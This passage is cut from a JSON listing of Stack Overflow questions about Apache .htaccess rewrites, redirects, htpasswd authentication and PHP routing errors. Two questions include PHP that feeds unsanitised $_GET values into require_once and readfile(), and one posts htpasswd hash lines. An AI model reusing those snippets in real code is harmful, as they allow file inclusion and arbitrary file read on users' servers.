Regards,</p>\n\n<p>Patrick</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12623116,"title":"redirect to file in subdirectory, if exist there","body":"<p>I have a '.htaccess' file that contain this code :<br>\n(It should to redirect names like \"P7-product_number_7\")  </p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n# if:\nRewriteCond %{DOCUMENT_ROOT}/cache%{REQUEST_URI}.html -f\n# then:\nRewriteRule ([A-z])([0-9]+)-([^/]*)?$ /cache%{REQUEST_URI}.html [B,L]\n# else:\nRewriteRule ([A-z])([0-9]+)-([^/]*)?$ index.php?type=$1&amp;id=$2&amp;label=$3 [B,L]\n</code></pre>\n\n<p>The checking of the existing of the file (in 'cache' directory) works fine, but the redirection doesn't works.<br>\n<strong><em>Why ?</em></strong>  </p>\n\n<p>I have tried to use \"<strong>RewriteRule  ^(.*)$  /cache/$1.html [L]</strong>\" instead the first RewriteRule, but it didn't worked too.<br>\n(the redirection if HTML file don't exist (in /cache/) works fine , the '.htaccess' and 'cache/' directory are in the '/var/www' directory, so %{REQUEST_URI} is \"/P7-product_number_7\")</p>\n"},{"tags":["wordpress",".htaccess","mod-rewrite","prestashop"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":12617949,"title":"How to prevent a rewriterule from changing the url to include a querystring when undesired?","body":"<p>I am having some trouble getting mod-rewrite rules in my .htaccess file to work like I need them to.</p>\n\n<p>I am trying to translate web requests made from:</p>\n\n<p><code>http://www.masterongspropshop.com/blog/22</code></p>\n\n<p>To: </p>\n\n<p><code>.../blog.php?idPost=22</code></p>\n\n<p>When I try, the URL always reverts to <code>.../blog?idPost=22</code>.  I have tried a couple of different variations but all of them seem to end with a similar result.</p>\n\n<p>The rewrite rules currently look like this:</p>\n\n<blockquote>\n<pre><code>RewriteRule ^blog$ blog.php [L]\nRewriteRule ^blog/([0-9]*)$ blog.php?idPost=$1 [L,QSA]\n</code></pre>\n</blockquote>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12320208,"title":"htaccess rewrite https removing secure prefix","body":"<p>I need to use the htaccess to rewrite from</p>\n\n<p><a href=\"https://secure25.securewebsession.com/domain.co.uk/wordpress\" rel=\"nofollow\">https://secure25.securewebsession.com/domain.co.uk/wordpress</a></p>\n\n<p>to <a href=\"http://www.domain.co.uk/wordpress\" rel=\"nofollow\">http://www.domain.co.uk/wordpress</a></p>\n\n<p>Is this possible?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":195,"score":0,"question_id":6857258,"title":".htaccess 301 redirect syntax","body":"<p>When I look in my webmaster tools account I see that I have lots of duplicate URL's. The duplicates are due to strange numbers being added to the end of each product parameter such as:</p>\n\n<p>/in​dex​.ph​p?r​out​e=p​rod​uct​/pr​odu​ct&amp;​pro​duc​t_i​d=1​58?​<strong>ax13g76h</strong></p>\n\n<p>I need to use syntax to strip anything after the <code>=158</code> UNLESS it is one of the parameters I use to order e.g sort, page or order. Can anyone suggest the syntax that I would need to do this via a 301 redirect?</p>\n"},{"tags":["security",".htaccess","joomla"],"answer_count":5,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":852,"score":3,"question_id":722973,"title":"Is it a security risk not to use a .htaccess file?","body":"<p>I have a Joomla site www.siteA.com and another Joomla site www.siteA.com/siteB.</p>\n\n<p>I have a .htaccess -file at siteA, but not at siteB.</p>\n\n<p><strong>Is it a security risk not to have a .htaccess -file at siteB?</strong></p>\n"},{"tags":["apache",".htaccess","url","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12617473,"title":"HTACCESS Mod_Rewrite Troubles","body":"<p>I'm having a bit of trouble with my mod_rewrite, I had this running perfectly fine on my previous litespeed VPS. Now I'm using my own dedicated server running CentOS 6, so I don't know if I haven't configured correctly.</p>\n\n<p>This is how it currently looks:</p>\n\n<p>http://<strong><em>*</em>**</strong>.com/?pageName=FourthPage</p>\n\n<p>This is how I want it to look:</p>\n\n<p>http://<strong><em>*</em>**</strong>.com/FourthPage</p>\n\n<p>This is my current .htaccess file:</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{REQUEST_fileNAME} !-d\nRewriteCond %{REQUEST_fileNAME} !-f\nRewriteRule ^([^/\\.]+)/?$ index.php?pageName=$1\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","redirect","web","subdomains"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12256130,"title":".htaccess redirect - automatically add www. if no subdomain exists","body":"<p>I have reviewed other posts but cannot find one that fully addresses my needs.</p>\n\n<p>I need any www. added automatically to my domain ONLY IF a subdomain is not already there.  I do want subdomains to bypass this redirect.</p>\n\n<p>How can I do this?</p>\n"},{"tags":["php",".htaccess","kohana"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12623500,"title":"No input file specified kohana","body":"<p>i use kohana 3.0, in htaccess i write:</p>\n\n<pre><code>RewriteRule .* index.php/?$0 [L] - $_GET empty\n\nRewriteRule .* index.php?$0 [L] - $_GET empty\n</code></pre>\n\n<p>i add qsa, but $_GET was empty to!!! why?</p>\n\n<pre><code>RewriteRule .* index.php?$0 [QSA,L,PT] - 500 internal error\n</code></pre>\n\n<p>please help, on my site work only first (index) page! thanks :)</p>\n\n<p>so, if query: site.us/cont/action/ - not work, but if site.us/index.php/cont/action/ - worked, help!!!</p>\n\n<p>full htaccess:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n#AddDefaultCharset utf-8\n\n\n# Turn on URL rewriting\n\n# Protect hidden files from being viewed\n&lt;Files .*&gt;\n    Order Deny,Allow\n    Deny From All\n&lt;/Files&gt;\n\n# Protect application and system files from being viewed\nRewriteRule ^(?:application|modules|system)\\b - [F,L]\n\n# Allow any files or directories that exist to be displayed directly\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\n# Rewrite all other URLs to index.php/URL\n#RewriteRule .* index.php?$0 [L]\n\nRewriteRule .* index.php/?$0 [L]\n</code></pre>\n"},{"tags":["php",".htaccess","seo","friendly-url"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":109,"score":0,"question_id":12095745,"title":"How to convert friendly url to original url","body":"<p>I have a URL which has been converted into SEO friendly url using .htaccess.But now i need to find the original url so that i can edit the file and locate it on the web server.The converted friendly url is</p>\n\n<p>Is is possible to get back the original url so that it can be located on the server.Thank you for your suggestions.</p>\n\n<p>.htaccess file view.</p>\n\n<pre><code># 1.To use URL Alias you need to be running apache with mod_rewrite enabled. \n\n# 2. In your opencart directory rename htaccess.txt to .htaccess.\n\n# For any support issues please visit: http://www.opencart.com\n\nOptions +FollowSymlinks\n\n# Prevent Directoy listing \nOptions -Indexes\n\n# Prevent Direct Access to files\n&lt;FilesMatch \"\\.(tpl|ini|log)\"&gt;\n Order deny,allow\n Deny from all\n&lt;/FilesMatch&gt;\n\n# SEO URL Settings\nRewriteEngine On\n# If your opencart installation does not run on the main web folder make sure you folder it does run in ie. / becomes /shop/ \n\nRewriteBase /\nRewriteRule ^sitemap.xml$ index.php?route=feed/google_sitemap [L]\nRewriteRule ^googlebase.xml$ index.php?route=feed/google_base [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !.*\\.(ico|gif|jpg|jpeg|png|js|css)\nRewriteRule ^([^?]*) index.php?_route_=$1 [L,QSA]\n\n### Additional Settings that may need to be enabled for some servers \n### Uncomment the commands by removing the # sign in front of it.\n### If you get an \"Internal Server Error 500\" after enabling any of the following settings, restore the # as this means your host doesn't allow that.\n\n# 1. If your cart only allows you to add one item at a time, it is possible register_globals is on. This may work to disable it:\n# php_flag register_globals off\n\n# 2. If your cart has magic quotes enabled, This may work to disable it:\n# php_flag magic_quotes_gpc Off\n\n# 3. Set max upload file size. Most hosts will limit this and not allow it to be overridden but you can try\n# php_value upload_max_filesize 999M\n\n# 4. set max post size. uncomment this line if you have a lot of product options or are getting errors where forms are not saving all fields\n# php_value post_max_size 999M\n\n# 5. set max time script can take. uncomment this line if you have a lot of product options or are getting errors where forms are not saving all fields\n# php_value max_execution_time 200\n\n# 6. set max time for input to be recieved. Uncomment this line if you have a lot of product options or are getting errors where forms are not saving all fields\n# php_value max_input_time 200\n</code></pre>\n"},{"tags":[".htaccess","redirect","rewrite","match"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12621098,"title":".htaccess rewrite except images and script files","body":"<p>I have the following rewrite:</p>\n\n<pre><code>RewriteRule ^/blog/(.*)$ http://www.domain.co.uk [NC,L,R=301]\n</code></pre>\n\n<p>But I only want it to happen if it is not a image file (.jpg, .gif, .png) or a script file (.js). Does anyone know how to set this?</p>\n\n<p>(It is a wordpress blog and I want to redirect all pages but keep the scripts and images active.)</p>\n\n<p>Thanks</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect","url-rewriting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12620973,"title":"Rewrite url without redirecting subpages","body":"<p>I'm having problems trying to figure out an url rewrite. Wondering if the following is possible?</p>\n\n<p>I have urls like so:</p>\n\n<pre><code>domain.com/component/directory/spanish/junior-cycle/culture\ndomain.com/component/directory/spanish/junior-cycle/vocabulary\ndomain.com/component/directory/spanish/junior-cycle/grammar\ndomain.com/component/directory/japanese/junior-cycle/grammar\ndomain.com/component/directory/french/junior-cycle/grammar\n</code></pre>\n\n<p>However I need to redirect the following to a static page without affecting the above</p>\n\n<pre><code>domain.com/component/component/spanish \n</code></pre>\n\n<p>it would go to a page like domain.com/spanishresources and same goes for french, japanese, etc.</p>\n\n<p>Can't for the life of me figure out how to do it. Anything I've tried has also redirected the lower level pages. Have searched across SO but haven't spotted anything that matches. Any help appreciated.</p>\n"},{"tags":[".htaccess","google-analytics"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":24,"score":-2,"question_id":12619713,"title":"Including search parameters in Google Analytics in order to track searches?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12577381/including-drupal-search-parameters-in-google-analytics\">Including drupal search parameters in Google Analytics?</a>  </p>\n</blockquote>\n\n\n\n<p>I have the following htaccess file:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !=/favicon.ico\nRewriteRule ^(.*)$ index.php?q=$1 [L,QSA]\n</code></pre>\n\n<p>So, if you search, you can enter the path like so:</p>\n\n<pre><code>mysite.com/search/SEARCH_STRING\n</code></pre>\n\n<p>I want Google Analytics to be able to track that this user searched for \"SEARCH_STRING\". How do I do that?</p>\n\n<p>In other words, if I go to www.google.com/analytics, how can I see who actually searched for specific items <strong>on my site</strong>? </p>\n"},{"tags":[".htaccess","mod-rewrite","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12221682,"title":"Rewrite for same file accross mutiple subfolders when using multiple domains in one root","body":"<p>I don't really know how to describe my problem in a sentence so instead I will explain with an example:</p>\n\n<p>Lets say I have a folder structure that looks like this:</p>\n\n<blockquote>\n  <p>/root</p>\n  \n  <p>/root/clientfolder1/testfile.php</p>\n  \n  <p>/root/clientfolder2/testfile.php</p>\n</blockquote>\n\n<p>etc...</p>\n\n<p>and the testfile.php is the same across all subfolders.</p>\n\n<p>Now say I just pushed out a new file called testfile2.php accross all subfolders so now testfile2.php exists within all subfolders.  </p>\n\n<p>I add a redirect to point the old testfile.php to the new testfile2.php</p>\n\n<p>So, in my .htaccess I add the following (Yes, 'RewriteEngine On' is set already in the .htaccess file):</p>\n\n<pre><code>RewriteRule (.*)/testfile\\.php /$1/testfile2.php [R=301,L]\n</code></pre>\n\n<p>okay now everything appears to work fine at this point however ( and this is where things get tricky) in my htaccess file I also have rules setup for multiple domains to point to specific folders like this:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} domain-one.com\nRewriteCond %{REQUEST_URI} !^/clientfolder1\nRewriteRule ^(.*)$ clientfolder1/$1 [L]\n\nRewriteCond %{HTTP_HOST} domain-two.com\nRewriteCond %{REQUEST_URI} !^clientfolder2\nRewriteRule ^(.*)$ clientfolder2/$1 [L]\n</code></pre>\n\n<p>etc...</p>\n\n<p>I also have a main (default domain name) that is used for my main site (files in root) lets call it main-domain.com</p>\n\n<p>So the following works:</p>\n\n<pre><code>domain-one.com/testfile.php\ndomain-one.com/testfile2.php\ndomain-two.com/testfile.php\ndomain-two.com/testfile2.php\nmain-domain.com/clientfolder1/testfile.php\nmain-domain.com/clientfolder2/testfile.php\n</code></pre>\n\n<p><strong>Now here's my question/problem:</strong></p>\n\n<p>My new redirect that I added above to replace the testfile.php with testfile2.php causes the following to happen:</p>\n\n<p><strong>domain-one.com/testfile.php</strong> redirects to:\n <strong>main-domain.com/clientfolder1/testfile2.php</strong></p>\n\n<p>but I need it to redirect to <strong>domain-one.com/testfile2.php</strong></p>\n\n<p>I cannot get this to work...  and getting frustrated as I am sure there is a simple solution to this and I am just missing something obvious.  Can this be done and how?</p>\n\n<p>Thanks in advance you your help - very much appreciated!!</p>\n"},{"tags":["php",".htaccess","codeigniter","mod-rewrite","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12242774,"title":"Codeigniter Page Not Found , change in .htacess","body":"<p>I was working on my test live server ,  i made some changes in a file and saved it , suddenly the whole website crashed.</p>\n\n<p>When i now log to my test server(http://www.uplits.com/). It shows a Directory has no index file error and when i log into the codeigniter(http://uplits.com/skidt/admin919/codeigniter/)</p>\n\n<p>It shows a page not found error.</p>\n\n<p>Please help , i dont know what could have gone wrong.</p>\n\n<pre><code>RewriteEngine on \nRewriteCond $1 !^(index\\.php|resources|robots\\.txt) \nRewriteCond %{REQUEST_FILENAME} !-f \nRewriteCond %{REQUEST_FILENAME} !-d \nRewriteRule ^(.*)$ index.php?$1 [L,QSA]\n</code></pre>\n"},{"tags":[".htaccess","redirect","http-referer"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12618445,"title":".htaccess Redirect based on HTTP_REFERER","body":"<p>I'm trying to do what I've said above but I am getting a looping error and sometimes a 500 error!</p>\n\n<p>What I want is for users requesting the root 'Home' page of the site to be redirected to <code>/Welcome</code> - UNLESS they are already browsing the site.</p>\n\n<p>Here's my code:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteCond %{HTTP_REFERER} !^mydomain\\.co\\.uk$ [N]\nRewriteCond %{REQUEST_URI} /index.php [N]\nRewriteRule ^$ /Welcome [L]\n</code></pre>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12617983,"title":".htaccess rewrite query string in url","body":"<p>I am trying to use mod_rewrite to keep only the query string in a url, and remove index.php?p=.</p>\n\n<p>For example, this link</p>\n\n<pre><code>http://domain.com/index.php?p=page-name-with-dashes\n</code></pre>\n\n<p>Into</p>\n\n<pre><code>http://domain.com/page-name-with-dashes.html\n</code></pre>\n\n<p>All pages are loaded through the control script index.php and the query p=name, like this</p>\n\n<pre><code>&lt;?php\n$page = isset($_GET['p']) ? $_GET['p'] : 'home';\n...\nrequire_once 'content-' . $page . '.php';\n...\n?&gt;\n</code></pre>\n\n<p>I have tried all variants below, but none works - some give 404 some give 500 errors.</p>\n\n<pre><code>#RewriteRule ^index.php?p=(.*) $1/\n\n#RewriteRule ^([^/]+)/?$ /index.php?p=$1 [QSA,L]\n\n#RewriteRule ^(.*)$ index.php?p=$1 [NC,L,QSA]\n</code></pre>\n\n<p>What am I doing wrong? I don't know much about htaccess rules, so forgive my newbie question.</p>\n"},{"tags":[".htaccess","cakephp","http-status-code-500","internal-server-error"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12616183,"title":"CakePHP 2.x .htaccess: Get 500 Internal Server Error","body":"<p><strong>Problem solved</strong></p>\n\n<ol>\n<li>Changed all folder and file permissions to 755</li>\n<li>All .htaccess files\nwith absolute paths (/app/webroot/)</li>\n</ol>\n\n<hr>\n\n<p>I moved my CakePHP 2.x website to another hoster (cyon.ch). Now i got 500 Internal Server Error. I tryed all the fixed who are recommended for the 1and1 hoster, but they won't work.</p>\n\n<p>The error comes from the /app/webroot/.htacces file, cause the others seems to work. If i try to call a image from the webroot/img directory, it works fine (www.myDomain.ch/img/myPicture.jpg), but not the index.php file.</p>\n\n<pre><code>AddType text/x-component .htc\n\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n\n    # FORCE WWW\n    RewriteCond %{HTTP_HOST} !^www\\.myDomain\\.ch$\n    RewriteRule ^(.*)$ http://www.myDomain.ch/$1 [R=301,L]\n\n    # REMOVE TRAILING SLASHES\n    RewriteRule ^(.*)/$ http://%{HTTP_HOST}/$1 [R=301,L]\n\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ index.php [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>The \"FORCE WWW\" and \"REMOVE TRAILING SLASHED\" are ok as well, if i type myDomain.ch/, i'll got redirect to www.myDomain.ch.</p>\n\n<p>My Domain points to /path/to/root/public_html. Thats also the folder, in which the cake app folder is located.</p>\n\n<p>Any idea?</p>\n\n<p>Thanks in advance!</p>\n\n<p>Edit: I found this error in the error log (Permissions for index.php are set to 755)</p>\n\n<pre><code>SoftException in Application.cpp:256: File \"/home/myUsername/public_html/app/webroot/index.php\" is writeable by group\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":158,"score":-4,"question_id":8705631,"title":"PHP page access without extension and variable","body":"<p>How can I create a PHP page system that we access without <code>.php</code> extension and without <code>?page=</code> variable?</p>\n\n<p>There's a simple exemple:</p>\n\n<pre><code>http://www.exemple.com/portfolio/1\n</code></pre>\n\n<p>Instead of:</p>\n\n<pre><code>http://www.exemple.com/portfolio.php?id=1\n</code></pre>\n\n<p>It would be great for me because I'm a web designer and this is a thing I never did. So it would be good to know this! Also I will use this in my website.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12611895,"title":"Why won't this htaccess exclude condition work?","body":"<p>I'm forcing https on all pages on our site, but because of complications with some old plugins we use (needing to connect over http), I need to set up an exception to the https forcing for one directory. </p>\n\n<p>I can't quite work it out though. The rule I think should work is giving me a 403 error. </p>\n\n<p>Can someone have a look? </p>\n\n<p>I've got a bunch of stuff for redirecting non-www to www:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} !^subdomain1.site.com$\nRewriteCond %{HTTP_HOST} !^subdomain2.site.com$\nRewriteRule ^(.*)$ http://www.site.com/$1 [R=301] \n</code></pre>\n\n<p>Then there's the https forcing:</p>\n\n<pre><code>RewriteCond %{HTTPS} !=on\nRewriteRule ^(.*)$ https://www.site.com/$1 [R,L]\n</code></pre>\n\n<p>But if I add another condition to exclude the directory from this rule:</p>\n\n<pre><code>RewriteCond %{HTTPS} !=on\nRewriteCond %{REQUEST_URI} !^/subdir/sub-subdir/\nRewriteRule ^(.*)$ https://www.site.com/$1 [R,L]\n</code></pre>\n\n<p>I get an error where I see the content from my 404 page, but the URL is <a href=\"https://www.site.com/403.shtml\" rel=\"nofollow\">https://www.site.com/403.shtml</a> - but I don't have a 403.shtml in my web root. (This is a WHM/cPanel-driven server)</p>\n"}]}
{"total":14528,"page":14,"pagesize":100,"questions":[{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12614746,"title":"Redirect complete url to another url","body":"<p>Actually i have changed my dynamic urls to static urls. But the strange thing is i have some old urls which are dynamic. Among them the url is <code>http://www.startonlinegames.com/download.php</code> . I want this url to redirect to <code>http://www.startonlinegames.com/download/?page=download</code> .. for this i have added the following htaccess rule in my htaccess file.</p>\n\n<pre><code>Redirect http://www.startonlinegames.com/download.php http://www.startonlinegames.com/download/?page=download\n</code></pre>\n\n<p>but its not working...can anyone suggest me.</p>\n"},{"tags":["php",".htaccess","dreamhost"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":963,"score":0,"question_id":9369781,"title":"htaccess rule to parse php in html files not working","body":"<p>can't for the life of me work out why this isn't working - on a dreamhost server, I've created an htaccess file and added <code>AddHandler php5-cgi .html .htm</code> to allow php in html files, as per the dreamhost docs. On an identical dreamhost package, I've done the same thing for another site and it worked perfectly, but in this case it just won't parse the php! Is there anything I could have missed here which could be causing the problem? The htaccess is in the web root and isn't being overridden by anything else.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12612745,"title":".htaccess redirect help please","body":"<p>How can I redirect a URL like\n<code>http://sample.com/view_image?v=random key like youtube</code></p>\n\n<p>to</p>\n\n<p><code>http://sample.com/view/?v=random key like youtube</code></p>\n\n<p>Thanks!</p>\n"},{"tags":["apache",".htaccess","htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12612170,"title":"How can I debug htpasswd access?","body":"<p>I have a site hosted on hostgator that I've set up with a directory to use htaccess/htpasswd for authentication. It's working fine but only for a user named test. </p>\n\n<p>Here's the relevant htaccess</p>\n\n<pre><code>&lt;filesMatch \"(-priv)\"&gt;\n    AuthType Basic\n    AuthName \"Private Area\"\n    AuthUserFile /home/username/public_html/site/test/.htpasswd\n    Require user test\n&lt;/filesMatch&gt;\n</code></pre>\n\n<p>and the htpasswd has 2 users</p>\n\n<pre><code>test:ovCvloB9kYgBQ\nadmin:RxvCRMqtdryys\n</code></pre>\n\n<p>I can log in using the test user but if I use <em>any</em> other name authentication fails. I can change the password for the test user and authentication reflects the change. The behavior is consistent across browsers and IPs. </p>\n\n<p>Is there any way to debug this?</p>\n\n<p>And before you say it, I know not to put the .htpasswd file above webroot, this is a test setup.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","query-string","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12610634,"title":"how to do a htaccess 301 redirect with query strings?","body":"<p>i have some links that i need to redirect, like:</p>\n\n<pre><code>/pass-help.php?action=1&amp;email=test@test.com to /about/help\nor\n/contests/contest-a?testa=1&amp;testb=1 /user/index/contest\n</code></pre>\n\n<p>i need a way to find the <code>action</code> or the <code>email</code> in the links above because they can be anything.</p>\n\n<p>maybe something like /pass-help.php?action=<code>(\\?.+)</code>&amp;email=<code>(\\?.+)</code> to /about/help</p>\n\n<p>but im not sure how to write the query string.</p>\n\n<p>any ideas?</p>\n\n<p>if so, please explain a bit so i can understand what is happening.</p>\n\n<p>thanks</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12607219,"title":"Logging specific requests in a seperate file","body":"<p>I would like to log requests coming for a particular file, say collect.gif into a separate log file using .htaccess, it this is achievable ?</p>\n\n<p>E.g \n<a href=\"http://www.domain.com/collect.gif?user=1&amp;page=sample\" rel=\"nofollow\">http://www.domain.com/collect.gif?user=1&amp;page=sample</a> must alone get logged into a file collect.log</p>\n"},{"tags":["wordpress",".htaccess","header"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12517358,"title":"Forcing \"save as\" when downloading a file with Chrome","body":"<p>We have a WordPress site that uses wp_properties. There are times when agents need to download the photo gallery from one of their properties. We are trying to make sure that the \"save as\" dialog shows up every time they click the download link. Basically we are doing this because some of the users are very non-technical and if they don't have the option to choose where the file is saved they don't know where to find it.</p>\n\n<p>When they click the \"export gallery\" link it kicks off an onclick event that goes through a process to create a zipped folder, with all of the properties photos, that is then downloaded to their machine. </p>\n\n<p>I have tried to use:</p>\n\n<pre><code>header(\"Content-Disposition: attachment\");\nheader(\"Content-Description: File Transfer\");\nheader(\"Content-Type: application/zip\");\nheader(\"Content-Transfer-Encoding: binary\");\n</code></pre>\n\n<p>in the header file, in many variations and within an if statement, but it either doesn't work at all or the dialog shows up when any link is clicked. </p>\n\n<p>I have also tried to use an .htaccess file in the folder where the .zip files are created:</p>\n\n<pre><code>&lt;FilesMatch \"\\.zip$\" &gt;\n    ForceType application/octet-stream\n    Header add Content-Disposition \"attachment\"\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>again, with different variations, but this doesn't seem to do anything. </p>\n\n<p>I feel like I am missing something pretty obvious. I would appreciate it if someone would point me in the right direction. Thanks.  </p>\n\n<p>I have tried making a link to a php file with the .zip file name and placing it in the same folder that the zip files are in,</p>\n\n<pre><code>$filename = $_GET['file'];\nif (isset($filename)){\n    header('Content-Type: application/octet-stream');\n    header('Content-Disposition: attachment; filename=\"' . $filename . '\"');\n    readfile($filename);\n}\nelse{\n    die('No file specified.');\n}\n</code></pre>\n\n<p>I have tried adding </p>\n\n<pre><code>AddType application/octet-stream .zip\n</code></pre>\n\n<p>to my .htaccess file. None of this has worked. </p>\n\n<p>Is there something specific to Chrome that is causing this? I have tried everything that I have found and nothing is working. Someone please help me out.</p>\n"},{"tags":["php",".htaccess","web-applications","http-post","httpserver"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":89,"score":2,"question_id":12606290,"title":"Only Allow POST Requests and Deny all other REQUEST_METHOD using .htaccess","body":"<p>I have some email PHP Scripts which I do not want the user to have a look by a GET, but I am using it to send as an email, using wufoo's webHook if anyone knows about it, so it uses POST so I just want POST Requests to be allowed otherwise, 403 or 404 how do I do that? </p>\n\n<p>I tried some answers given on SO and browsed documentation of apache web server, the best answer I found was this: </p>\n\n<pre><code> RewriteEngine On\n RewriteCond %{REQUEST_METHOD} !=GET\n RewriteRule ^.*$ /path/to\n</code></pre>\n\n<p>But I suppose this should be written in the directory where I have PHP Script, I just want use one .htaccess in root. </p>\n\n<p>Folder Structure : </p>\n\n<pre><code>      public_html (would want to use this folders .htaccess only)\n      -- email \n         -- mail.php (ONLY POST)\n</code></pre>\n\n<p>I know we can use REQUEST_METHOD in <code>mail.php</code> directly but I don't want to do that, it is kind of thing which is not related to the script actually.</p>\n\n<p>can anyone provide some help. </p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12608351,"title":".htaccess - redirect from subdirectory to root directory for non existing files","body":"<p><strong>Current directory structure:</strong></p>\n\n<pre><code>wwwpublic\n|+ spanish(language)\n|-- index.php\n|-- contact.php\n|\n|- index.php\n|- aboutus.php\n|- products.php\n|- contact.php\n</code></pre>\n\n<p>In the root of wwwpublic directory I have files in the English language. Since site have Spanish language too, I have created separate directory named 'spanish'. Name of pages are exactly the same in both directories.</p>\n\n<p>Now, some pages in spanish directory don't exist and I need to redirect request to such pages to root folder and retain name of file requested.</p>\n\n<p>Example:\nVisitor go to Spanish version, open index.php there, then he clicks on aboutus.php page (dont exists) inside spanish directory and then .htaccess redirects him to the /root/aboutus.php</p>\n"},{"tags":[".htaccess","url-rewriting","web-routes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12608172,"title":"Hiding a Sub Directory in URL","body":"<p>Inside <strong>public_html</strong> directory I have a folder <strong>myfolder</strong> and I have the <strong>index.php</strong> in that folder. </p>\n\n<p>All my site url reads</p>\n\n<pre><code>http://mysite.com/myfolder/page-name\n</code></pre>\n\n<p>I want it to rewritten as </p>\n\n<pre><code>http://mysite.com/page-name\n</code></pre>\n\n<p>What rule should I write in <strong>.htaccess</strong> to achieve the same</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12573124,"title":"foward root directory to folder then remove name of folder so it looks like root directory with .htacess and compatible in ie","body":"<p>I would like to forward my root directory \"mydomain.com\" to a folder in my root \"/oro/\" but have pages not list the folder name \"mydomain.com/oro/gold.html\" but instead have it be: \"mydomain.com/gold.html\" Is this possible? I have the forwarding part, but want to remove the folder's name to make it appear as the root.</p>\n\n<pre><code> RewriteEngine on\n RewriteCond %{HTTP_HOST} ^(www.)?mydomain.com$\n\n RewriteCond %{REQUEST_URI} !^/oro/\n\n RewriteCond %{REQUEST_FILENAME} !-f\n RewriteCond %{REQUEST_FILENAME} !-d\n\n RewriteRule ^(.*)$ /oro/$1\n\n RewriteCond %{HTTP_HOST} ^(www.)?mydomain.com$\n RewriteRule ^(/)?$ /oro/index.php [L]\n</code></pre>\n\n<p>Thanks in advanced!!</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>Jon Lin's answer is correct, but breaks in IE. Any 